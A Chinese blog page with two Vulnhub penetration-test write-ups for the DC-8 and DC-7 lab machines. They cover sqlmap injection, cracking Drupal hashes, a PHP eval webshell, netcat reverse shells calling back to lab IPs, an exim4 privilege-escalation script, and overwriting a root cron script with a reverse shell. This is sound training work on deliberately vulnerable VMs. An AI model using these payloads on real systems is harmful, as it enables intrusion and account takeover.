<h2 id="寻找利用点"><a href="#寻找利用点" class="headerlink" title="寻找利用点"></a>寻找利用点</h2><p>这时候注意到一个小细节</p>
<p><img src="/../images/image-20210227122542823.png" alt="image-20210227122542823"></p>
<p>首页的Details点开会传GET参数nid，随手试了试<code>/?nid=1&#39;</code>发现回传页面不一样！</p>
<p><img src="/../images/image-20210227122659122.png" alt="image-20210227122659122"></p>
<p>SQL注入！终于刷到了QAQ</p>
<p>这里图省事，sqlmap跑一波，先爆出数据库名儿（吐槽一下这不是dc8吗为啥要叫d7）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u &lt;url&gt;/?nid=1 --dbs </span><br></pre></td></tr></table></figure>

<ol>
<li>sqlmap python3 sqlmap.py -u <url>&#x2F;？id&#x3D;1 –dbs                                               查询数据库的库名</li>
<li>sqlmap python3 sqlmap.py -u <url> -D 数据库名 –tables                                     查询数据库的表名</li>
<li>sqlmap python3 sqlmap.py -u <url> -D 数据库名 -T 表名 –column                       查找字段</li>
<li>sqlmap python3 sqlmap.py -u <url> -D 数据库名 -T 表名 -C flag –dump              可显示flag</li>
</ol>
<p><img src="/../images/image-20210227123327238.png" alt="image-20210227123327238"></p>
<p>这两个数据库都分别进行查询其中在d7db库中发现了<code>users</code>的表，展开发现结果如下</p>
<p><img src="/../images/image-20210227124102705.png" alt="image-20210227124102705"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u &lt;url&gt;/?nid=1 -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210227124350621.png" alt="image-20210227124350621"></p>
<p>好家伙，，，爆是爆出来了，但是$S$说明它用的是自己定义脚本进行的hash转换。。。也就是说我们仅仅知道了用户名儿</p>
<table>
<thead>
<tr>
<th>name</th>
<th align="center">password</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td align="center">$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</td>
</tr>
<tr>
<td>john</td>
<td align="center">$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF</td>
</tr>
</tbody></table>
<p>那现在就有俩思路</p>
<ol>
<li>直接去web爆破admin和john的账号密码</li>
<li>使用<code>john the rapper</code>进行爆破这个哈希值</li>
</ol>
<p><img src="/../images/image-20210227133122901.png" alt="image-20210227133122901"></p>
<p>john the rapper解出来了john的密码<code>john:turtle</code>。</p>
<p>hydra爆破也走了一波，，，哪怕我开了12线程，用kali自带rockyou.txt也非常慢，，，</p>
<p>所以直接走登录吧</p>
<p><img src="/../images/image-20210227140123740.png" alt="image-20210227140123740"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录上去后，发现contact us的页面是可以修改编辑的，自然想到使用php格式写入一句话木马连webshell</p>
<p><img src="/../images/image-20210227141301381.png" alt="image-20210227141301381"></p>
<p>因为上传之后没有上传的地址，所以webshell先暂时搁置</p>
<p>这里需要用户再次提交信息，才能触发php代码</p>
<p>那换一种方式</p>
<p>直接反弹shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/bash 192.168.8.120 7777&quot;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210227142557185.png" alt="image-20210227142557185"></p>
<p>OK，有了！</p>
<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>先检查SUID，确实有几个可以思考的方向，先码着</p>
<p><img src="/../images/image-20210227143319450.png" alt="image-20210227143319450"></p>
<p>在输入<code>sudo -l</code>，康康www-data有哪些无密码的root权限，发现并没有，但这算提示吗，虽然我看不懂</p>
<p><img src="/../images/image-20210227143619470.png" alt="image-20210227143619470"></p>
<p>先试试exim4吧，46996.sh这个脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure>



<p><img src="/../images/image-20210227143916923.png" alt="image-20210227143916923"></p>
<p>诶，4.89好像符合诶</p>
<p>直接nc上传文件，同样还是在&#x2F;tmp文件夹下，因为该文件夹权限较大</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali</span></span><br><span class="line">nc -lnvp 1234 &lt; 46996.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">靶机</span></span><br><span class="line">nc 192.168.8.121 1234 &gt; 46996.sh</span><br></pre></td></tr></table></figure>

<p><code>chmod +x 46996.sh</code>给权限，留待使用</p>
<p>这个地方直接在&#x2F;tmp文件下运行脚本会显示一个很奇怪的错误，这里参考了eson的文章：</p>
<blockquote>
<p>exp的文本格式是 dos文件的格式 然后linux的格式是不能跑的</p>
<p>因为dos格式编写的是 CRLF 而mac是CR unix是LF</p>
<p>所以多出来的CR \r会导致命令执行错误 并且 在检查文件的时候 并不会看到 （这种字符是不可见的非打印字符）</p>
</blockquote>
<p>解决方法是</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/\r//&#x27;</span> 46996.sh</span><br></pre></td></tr></table></figure>

<p>之后再使用netcat方式提权</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash 46996.sh -m netcat</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210227150359640.png" alt="image-20210227150359640"></p>
<p>getshell！</p>
<p><img src="/../images/image-20210227150551740.png" alt="image-20210227150551740"></p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>之后我测试了一下一句话，确实不是<code>/node/3/done</code>这个位置，也就是说，没有上传的位置，就无法连接webshell。</p>
<p>OK，DC系列应该只剩下一个DC-9了，加油ヾ(◍°∇°◍)ﾉﾞ</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2021/02/27/DC8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-DC7靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2021/02/23/DC7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC7靶机渗透记录</a>
  
    </h1>
  


  
  
<a href="/2021/02/23/DC7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
        <time datetime="2021-02-23T15:27:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-23</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>DC7靶机渗透记录</center>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老生常谈了，直接放图了。</p>
<p><img src="/../images/image-20210223192347874.png" alt="image-20210223192347874"></p>
<p><img src="/../images/image-20210223192646054.png" alt="image-20210223192646054"></p>
<p>还是传统艺能，22和80端口，不过这次是Apache的中间件，Debian系统，嗯，先记着。访问web端进一步收集信息</p>
<p><img src="/../images/image-20210223193107270.png" alt="image-20210223193107270"></p>
<p>好家伙，看着英文意思是<code>escape the sandbox</code>哇，沙盒逃离？意思是我之后get的shell可能是一个docker？好家伙，先扫描目录吧。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[19:36:26] 200 -   18KB - /LICENSE.txt                                         </span><br><span class="line">[19:36:26] 200 -   95B  - /INSTALL.txt</span><br><span class="line">[19:36:27] 302 -  368B  - /Search  -&gt;  http://192.168.1.10/search/node                                [19:36:34] 301 -  311B  - /core  -&gt;  http://192.168.1.10/core/                                        [19:36:35] 301 -  336B  - /forum/install/install.php  -&gt; http://192.168.1.10/forum/install/core/install.php</span><br><span class="line">[19:36:36] 403 -  298B  - /globals.inc                           </span><br><span class="line">[19:36:36] 403 -  296B  - /index.inc                                                      </span><br><span class="line">[19:36:36] 403 -  300B  - /index.php.bak</span><br><span class="line">[19:36:36] 403 -  297B  - /index.php~                                                     </span><br><span class="line">[19:36:36] 200 -    9KB - /index.php                                                  </span><br><span class="line">[19:36:37] 301 -  322B  - /install.php  -&gt;  http://192.168.1.10/core/install.php</span><br><span class="line">[19:36:38] 301 -  314B  - /modules  -&gt;  http://192.168.1.10/modules/                  </span><br><span class="line">[19:36:39] 200 -    8KB - /node                                                             </span><br><span class="line">[19:36:49] 301 -  315B  - /profiles  -&gt;  http://192.168.1.10/profiles/                </span><br><span class="line">[19:36:52] 200 -    2KB - /robots.txt   </span><br><span class="line">[19:36:53] 302 -  368B  - /search  -&gt;  http://192.168.1.10/search/node                               [19:36:57] 301 -  312B  - /sites  -&gt;  http://192.168.1.10/sites/</span><br><span class="line">[19:37:05] 301 -  313B  - /themes  -&gt;  http://192.168.1.10/themes/                     </span><br><span class="line">[19:37:09] 302 -  364B  - /user  -&gt;  http://192.168.1.10/user/login         </span><br><span class="line">[19:37:09] 302 -  364B  - /user/  -&gt;  http://192.168.1.10/user/login    </span><br><span class="line">[19:37:10] 200 -   10KB - /user/login/  </span><br><span class="line">[19:37:12] 200 -    4KB - /web.config                              </span><br><span class="line">[19:37:13] 301 -  331B  - /wp-admin/install.php  -&gt;  http://192.168.1.10/wp-admin/core/install.php</span><br></pre></td></tr></table></figure>

<p>大致扫出来了以上的目录，然后顺便也确定了CMS，同DC-1，也是<code>Drupal</code>。（但是版本上肯定要比DC-1高了，就不是直接msf能搞定的了）</p>
<p><img src="/../images/image-20210223195320471.png" alt="image-20210223195320471"></p>
<p>web端的<code>robots.txt</code>文件显示，大多的目录我们都无法查看。思路又断了，，，</p>
<h2 id="寻找利用点"><a href="#寻找利用点" class="headerlink" title="寻找利用点"></a>寻找利用点</h2><p>查了一下思路，，，这居然要从CMS下的<code>@DC7USERS</code>，从twitter找到他的github账号，上面有这个网站的源码。。。从这里代码审计。。。</p>
<p><img src="/../images/image-20210223201419837.png" alt="image-20210223201419837"></p>
<p><img src="/../images/image-20210223201507661.png" alt="image-20210223201507661"></p>
<p>QAQ，厉害了，还能这么来。直接在<code>config.php</code>里面发现了账号密码…（⊙＿⊙；）……（⊙＿⊙；）…</p>
<p><img src="/../images/image-20210223201918018.png" alt="image-20210223201918018"></p>
<p>那就登录试试呗</p>
<p><img src="/../images/image-20210223202221029.png" alt="image-20210223202221029"></p>
<p>很奇怪啊，一直错误，那就说明不是这个的账号密码，，，一个想法突然出现了⊙﹏⊙∥，不会是ssh登录的账号密码吧，但转念一想也很有可能，前面web端设计那么简单，那估计就验证了我之前的猜测，这是个沙盒逃离的docker</p>
<p><img src="/../images/image-20210223202609051.png" alt="image-20210223202609051"></p>
<p>登，，，登上去了，还真是。。。</p>
<p><img src="/../images/image-20210223202734391.png" alt="image-20210223202734391"></p>
<p>试了一下SUID权限的命令，嗯，exim4没有权限利用，其他也一样，也就是说路线不在这里。同时还发现mbox这个文件里有很多的信息</p>
<p><img src="/../images/image-20210223203012828.png" alt="image-20210223203012828"></p>
<p>首先提到了一个脚本，在<code>/opt/scripts</code>下的一个脚本，查看这个脚本得到的，应该是<code>drupal</code>这个CMS用到的东西，且分配权限给了<code>root</code>和<code>www-data</code>这两个</p>
<p><img src="/../images/image-20210223212909460.png" alt="image-20210223212909460"></p>
<p>这个脚本能够使用，也就是说该靶机配置了<code>drush</code>这个shell，通过这个shell，我们能做很多很多事情，参考该链接         <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/60880048">我是链接</a></p>
<p><img src="/../images/image-20210223214017318.png" alt="image-20210223214017318"></p>
<p>同时，这个web目录并没有发现hash转换的脚本，也就是说直接改密码即可。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=”newpassword”</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210223214201146.png" alt="image-20210223214201146"></p>
<p>OK，来登录CMS的admin账户XD</p>
<p>QAQ我是万万没想到，我在这个登录卡了这么这么久，，，最后分析原因我猜测</p>
<ul>
<li>第一次修改完密码，我直接去登录了，但实际上要等一会儿，等发送邮件后，那个脚本显示了，定期执行脚本，实现对数据库和站点代码进行备份加密，并删掉了原来的，只留下加密后的。所以新密码上传更新有一段时间</li>
<li>第二点就是，我直接错误登录太多次被ban了，，，然后我还不知道，，，还一直改密码输入，，，最后查了drupal的官网，使用了解除锁定命令在等冷却才登录上去了。。。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush php-eval &#x27;db_query(&quot;DELETE FROM &#x27;flood&#x27;&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>解锁命令如上。。。</p>
<p><img src="/../images/image-20210223221804577.png" alt="image-20210223221804577"></p>
<p>此时思路大致就是，因为这个dc7user的账号我们并不能获得任何提权的有用信息（SUID权限被限制了），所以只好从web反弹一个www-data的shell，因为前面的脚本用户大多都是root和www-data，此时我们先给drupal安装php模块<strong>（这里我是直接从官网的url来安装，方便，且避免了本地解压之类的错误）</strong></p>
<p><img src="/../images/image-20210223223010503.png" alt="image-20210223223010503"></p>
<p><img src="/../images/image-20210223223022559.png" alt="image-20210223223022559"></p>
<p>安装完比之后激活（下面第二个），勾选再install</p>
<p><img src="/../images/image-20210223223203353.png" alt="image-20210223223203353"></p>
<p><img src="/../images/image-20210223223227080.png" alt="image-20210223223227080"></p>
<p>OK了第一个思路是一句话木马，然后传马，连webshell，反弹。第二个方法是直接用msfvenon来生成马。这里我还是选择再相信蚁剑一次。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便发布一篇文章，然后内容为一句话木马</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUERST</span>[<span class="number">123</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#再选择php code编码</span></span><br></pre></td></tr></table></figure>

<p>蚁剑上正常填，这里我是直接对着welcome的文章修改的，所以url直接就可以填写下面那个了。</p>
<p>url: <code>http://192.168.1.10/</code>   密码<code>123</code></p>
<p><img src="/../images/image-20210223224627613.png" alt="image-20210223224627613"></p>
<p>好家伙成了一次！泪目哇QWQ</p>
<p><img src="/../images/image-20210223225123527.png" alt="image-20210223225123527"></p>
<p>直接打开虚拟终端，nc反弹shell，kali本地监听回弹，转为交互式shell（一个字母也不要输错，，，我输错了个单引号又卡了一会儿。。。）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210223230216012.png" alt="image-20210223230216012"></p>
<p>OK，再次回到这个位置，现在我是www-data用户了，有权限执行这个脚本了，一个显然的思路就是，修改该脚本内容提权。</p>
<p>这里提权我有一个小小的疑问，放尾声说，因为该脚本一定时间就会执行，所以可以直接再次nc反弹一个shell到kali上，那也就是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.1.11 777&quot; &gt; /opt/scripts/backups.sh#直接覆盖</span><br></pre></td></tr></table></figure>

<p>OK，等待了一会儿，有了回弹shell</p>
<p><img src="/../images/image-20210223231606069.png" alt="image-20210223231606069"></p>
<p>果然是root！</p>
<p><img src="/../images/image-20210223231736953.png" alt="image-20210223231736953"></p>
<p>XD</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>又学到了点东西，很开心XD，但是关于这个原理我不是很清楚，就是那个定时执行的脚本，有两个用户有权限使用<code>root</code>和<code>www-data</code>，但时为什么我使用www-data用户修改脚本nc反弹shell，会直接回弹出来root？？？</p>
<p>是因为我本身占用了www-data用户吗？？？</p>
<p>这里有点不太明白。</p>
<p>最后，还是猜错了，我以为开始的意思是逃离容器的思路XD，虚惊一场</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2021/02/23/DC7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2018-2023 <a href="https://username.github.io/" target="_blank">Isabella</a>
    	</div>
      	<div class="footer-right">
			
			
      		GitHub:<a href="https://github.com/JoeyBling/hexo-theme-yilia-plus" target="_blank">hexo-theme-yilia-plus</a> by Litten
      	</div>
    </div>
  </div>
  
  
	<script src="/lib/busuanzi.pure.js"></script>
	
  
  
	
	<span id="busuanzi_container_site_pv" style="display:none">
		本站总访问量<span id="busuanzi_value_site_pv"></span>次	
	        <span class="post-meta-divider" >|</span>
	</span>
  	<span id="busuanzi_container_site_uv" style='display:none'>
  		本站访客数<span id="busuanzi_value_site_uv"></span>人
  	</span>
  
</footer>

    </div>
    <script>
	var yiliaConfig = {
		mathjax: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: true,
		toc_hide_index: true,
		root: "/",
		innerArchive: true,
		showTags: true
	}
</script>

<script>!function(r){function e(t){if(i[t])return i[t].exports;var n=i[t]={exports:{},id:t,loaded:!1};return r[t].call(n.exports,n,n.exports,e),n.loaded=!0,n.exports}var i={};e.m=r,e.c=i,e.p="./",e(0)}([function(t,n,r){r(208),t.exports=r(205)},function(t,n,r){var d=r(3),y=r(46),g=r(26),b=r(27),x=r(47),m="prototype",S=function(t,n,r){var e,i,o,u,c=t&S.F,f=t&S.G,a=t&S.S,s=t&S.P,l=t&S.B,h=f?d:a?d[n]||(d[n]={}):(d[n]||{})[m],v=f?y:y[n]||(y[n]={}),p=v[m]||(v[m]={});for(e in f&&(r=n),r)o=((i=!c&&h&&void 0!==h[e])?h:r)[e],u=l&&i?x(o,d):s&&"function"==typeof o?x(Function.call,o):o,h&&b(h,e,o,t&S.U),v[e]!=o&&g(v,e,u),s&&p[e]!=o&&(p[e]=o)};d.core=y,S.F=1,S.G=2,S.S=4,S.P=8,S.B=16,S.W=32,S.U=64,S.R=128,t.exports=S},function(t,n,r){var e=r(5);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n,r){var e=r(118)("wks"),i=r(79),o=r(3).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(49),i=Math.min;t.exports=function(t){return 0<t?i(e(t),9007199254740991):0}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){t.exports=!r(4)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(2),i=r(174),o=r(53),u=Object.defineProperty;n.f=r(10)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){t.exports=!r(20)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(14),i=r(24);t.exports=r(12)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(22),i=r(60),o=r(42),u=Object.defineProperty;n.f=r(12)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){var e=r(96),i=r(34);t.exports=function(t){return e(i(t))}},function(t,n,r){var e=r(40)("wks"),i=r(25),o=r(6).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(51);t.exports=function(t){return Object(e(t))}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){var r=t.exports={version:"2.6.9"};"number"==typeof __e&&(__e=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n,r){var e=r(18);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=!0},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var r=0,e=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++r+e).toString(36))}},function(t,n,r){var e=r(11),i=r(75);t.exports=r(10)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var o=r(3),u=r(26),c=r(30),f=r(79)("src"),e=r(219),i="toString",a=(""+e).split(i);r(46).inspectSource=function(t){return e.call(t)},(t.exports=function(t,n,r,e){var i="function"==typeof r;i&&(c(r,"name")||u(r,"name",n)),t[n]!==r&&(i&&(c(r,f)||u(r,f,t[n]?""+t[n]:a.join(String(n)))),t===o?t[n]=r:e?t[n]?t[n]=r:u(t,n,r):(delete t[n],u(t,n,r)))})(Function.prototype,i,function(){return"function"==typeof this&&this[f]||e.call(this)})},function(t,n,r){var e=r(1),i=r(4),u=r(51),c=/"/g,o=function(t,n,r,e){var i=String(u(t)),o="<"+n;return""!==r&&(o+=" "+r+'="'+String(e).replace(c,"&quot;")+'"'),o+">"+i+"</"+n+">"};t.exports=function(n,t){var r={};r[n]=t(o),e(e.P+e.F*i(function(){var t=""[n]('"');return t!==t.toLowerCase()||3<t.split('"').length}),"String",r)}},function(t,n,r){var e=r(65),i=r(35);t.exports=Object.keys||function(t){return e(t,i)}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){var e=r(117),i=r(75),o=r(33),u=r(53),c=r(30),f=r(174),a=Object.getOwnPropertyDescriptor;n.f=r(10)?a:function(t,n){if(t=o(t),n=u(n,!0),f)try{return a(t,n)}catch(t){}if(c(t,n))return i(!e.f.call(t,n),t[n])}},function(t,n,r){var e=r(30),i=r(17),o=r(154)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=i(t),e(t,o)?t[o]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n,r){var e=r(116),i=r(51);t.exports=function(t){return e(i(t))}},function(t,n){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,r){var e=r(14).f,i=r(9),o=r(16)("toStringTag");t.exports=function(t,n,r){t&&!i(t=r?t:t.prototype,o)&&e(t,o,{configurable:!0,value:n})}},function(t,n,r){var e=r(40)("keys"),i=r(25);t.exports=function(t){return e[t]||(e[t]=i(t))}},function(t,n,r){var e=r(19),i=r(6),o="__core-js_shared__",u=i[o]||(i[o]={});(t.exports=function(t,n){return u[t]||(u[t]=void 0!==n?n:{})})("versions",[]).push({version:e.version,mode:r(23)?"pure":"global",copyright:"© 2019 Denis Pushkarev (zloirock.ru)"})},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(0<t?e:r)(t)}},function(t,n,r){var i=r(18);t.exports=function(t,n){if(!i(t))return t;var r,e;if(n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;if("function"==typeof(r=t.valueOf)&&!i(e=r.call(t)))return e;if(!n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(6),i=r(19),o=r(23),u=r(44),c=r(14).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){n.f=r(16)},function(t,n){var r={}.toString;t.exports=function(t){return r.call(t).slice(8,-1)}},function(t,n){var r=t.exports={version:"2.6.9"};"number"==typeof __e&&(__e=r)},function(t,n,r){var o=r(21);t.exports=function(e,i,t){if(o(e),void 0===i)return e;switch(t){case 1:return function(t){return e.call(i,t)};case 2:return function(t,n){return e.call(i,t,n)};case 3:return function(t,n,r){return e.call(i,t,n,r)}}return function(){return e.apply(i,arguments)}}},function(t,n,r){"use strict";var e=r(4);t.exports=function(t,n){return!!t&&e(function(){n?t.call(null,function(){},1):t.call(null)})}},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(0<t?e:r)(t)}},function(t,n,r){var x=r(47),m=r(116),S=r(17),w=r(8),e=r(138);t.exports=function(l,t){var h=1==l,v=2==l,p=3==l,d=4==l,y=6==l,g=5==l||y,b=t||e;return function(t,n,r){for(var e,i,o=S(t),u=m(o),c=x(n,r,3),f=w(u.length),a=0,s=h?b(t,f):v?b(t,0):void 0;a<f;a++)if((g||a in u)&&(i=c(e=u[a],a,o),l))if(h)s[a]=i;else if(i)switch(l){case 3:return!0;case 5:return e;case 6:return a;case 2:s.push(e)}else if(d)return!1;return y?-1:p||d?d:s}}},function(t,n){t.exports=function(t){if(null==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n,r){var i=r(1),o=r(46),u=r(4);t.exports=function(t,n){var r=(o.Object||{})[t]||Object[t],e={};e[t]=n(r),i(i.S+i.F*u(function(){r(1)}),"Object",e)}},function(t,n,r){var i=r(5);t.exports=function(t,n){if(!i(t))return t;var r,e;if(n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;if("function"==typeof(r=t.valueOf)&&!i(e=r.call(t)))return e;if(!n&&"function"==typeof(r=t.toString)&&!i(e=r.call(t)))return e;throw TypeError("Can't convert object to 